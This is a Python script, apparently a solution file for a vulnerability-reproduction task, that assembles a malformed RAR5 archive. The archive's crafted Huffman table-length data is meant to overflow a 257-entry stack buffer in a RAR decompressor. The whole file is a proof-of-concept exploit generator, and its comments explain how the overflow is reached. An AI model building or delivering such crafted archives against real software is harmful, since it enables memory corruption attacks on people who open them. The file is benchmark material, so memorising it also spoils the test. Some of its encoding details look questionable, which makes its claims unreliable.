import zlib

class Solution:
    @staticmethod
    def _crc32(data: bytes) -> int:
        return zlib.crc32(data) & 0xFFFFFFFF

    @staticmethod
    def _vint(n: int) -> bytes:
        out = bytearray()
        if n == 0:
            return b'\x00'
        while n > 0:
            byte = n & 0x7F
            n >>= 7
            if n > 0:
                byte |= 0x80
            out.append(byte)
        return bytes(out)

    def solve(self, src_path: str) -> bytes:
        # 1. RAR5 Signature
        sig = b'\x52\x61\x72\x21\x1a\x07\x01\x00'

        # 2. Main Archive Header (Type=0x01)
        main_body = self._vint(1) + self._vint(0)
        size = len(main_body) + len(self._vint(len(main_body) + 1))
        main_size_vint = self._vint(size)
        main_to_crc = main_size_vint + main_body
        main_crc = self._crc32(main_to_crc).to_bytes(4, 'little')
        main_header = main_crc + main_to_crc

        # 3. File Block (Header + Malicious Data)
        
        # 3.1. Craft the malicious packed data.
        # The vulnerability is a stack buffer overflow when decompressing Huffman table lengths.
        # The main alphabet table (`PDecode`) has a buffer of size MC+1 = 257.
        # We use RLE-like commands to write more than 257 values into this buffer.
        
        # Sequence:
        # \x11 \xfc: repeat 0, 252+3=255 times. Fills indices 0-254.
        # \x00: literal 0. Fills index 255.
        # \x11 \x00: repeat 0, 0+3=3 times. Fills indices 256, 257, 258 -> Overflow.
        payload = b'\x11\xfc\x00\x11\x00'

        # Dummy tables for other decoders to allow parsing to continue.
        # DDecode size: 65 -> repeat 0, 62+3 times
        # ADecode size: 18 -> repeat 0, 15+3 times
        # LDecode size: 29 -> repeat 0, 26+3 times
        other_tables = b'\x11\x3e' + b'\x11\x0f' + b'\x11\x17'
        
        # Packed data stream header: 0b110 = 0x06
        # bit 0: Block type (0=LZ)
        # bit 1: Is last block (1=yes)
        # bit 2: Use tables (1=yes)
        packed_data_prefix = b'\x06'
        packed_data = packed_data_prefix + payload + other_tables

        # 3.2. Construct the File Header (Type=0x02)
        data_size = len(packed_data)
        unpacked_size = 1
        file_name = b'a'
        file_flags = 0
        file_attributes = 0x20  # Archive
        file_time = 0
        comp_info = 5  # Method 5
        host_os = 2  # Unix
        
        file_header_part = (
            self._vint(file_flags) +
            self._vint(unpacked_size) +
            self._vint(file_attributes) +
            file_time.to_bytes(4, 'little') +
            self._vint(comp_info) +
            self._vint(host_os) +
            self._vint(len(file_name)) +
            file_name
        )

        header_type = 2
        # HFL_DATA | HFL_UNP_SIZE | HFL_TIME
        header_flags = (1 << 7) | (1 << 4) | (1 << 1)

        block_header_part = (
            self._vint(header_type) +
            self._vint(header_flags) +
            self._vint(data_size)
        )
        
        header_body = block_header_part + file_header_part
        
        size = len(header_body) + len(self._vint(len(header_body) + 1))
        header_size_vint = self._vint(size)
        
        file_header_to_crc = header_size_vint + header_body
        file_header_crc = self._crc32(file_header_to_crc).to_bytes(4, 'little')
        
        file_block = file_header_crc + file_header_to_crc + packed_data

        # 4. End of Archive Header (Type=0x05)
        eoa_body = self._vint(5) + self._vint(0)
        size = len(eoa_body) + len(self._vint(len(eoa_body) + 1))
        eoa_size_vint = self._vint(size)
        eoa_to_crc = eoa_size_vint + eoa_body
        eoa_crc = self._crc32(eoa_to_crc).to_bytes(4, 'little')
        end_header = eoa_crc + eoa_to_crc

        # 5. Assemble the final PoC
        poc = sig + main_header + file_block + end_header
        
        return poc